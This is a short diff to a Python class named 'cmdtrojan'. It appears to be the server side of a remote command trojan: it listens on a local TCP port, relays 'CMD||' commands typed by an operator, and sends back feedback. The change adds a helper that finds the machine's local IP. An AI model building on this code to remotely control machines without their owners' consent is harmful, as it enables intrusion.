@@ -10,6 +10,7 @@ class cmdtrojan:
         self.__networkinit()
 
     def __networkinit(self):
+        # host = self.getLocalIP()
         host = '127.0.0.1'
         port = 9696
         self.tcps = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -45,6 +46,13 @@ class cmdtrojan:
                 client_socket.send(feedback.encode())
             print(data)
 
+    def getLocalIP(self):
+        st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        st.connect(("8.8.8.8", 80))
+        LIP = st.getsockname()[0]
+        print(LIP)
+        st.close()
+        return LIP
     # def client_handle(self, client_socket, client_addr):
     #     while True:
     #         cmd_str = "CMD||" + input('Input command:')
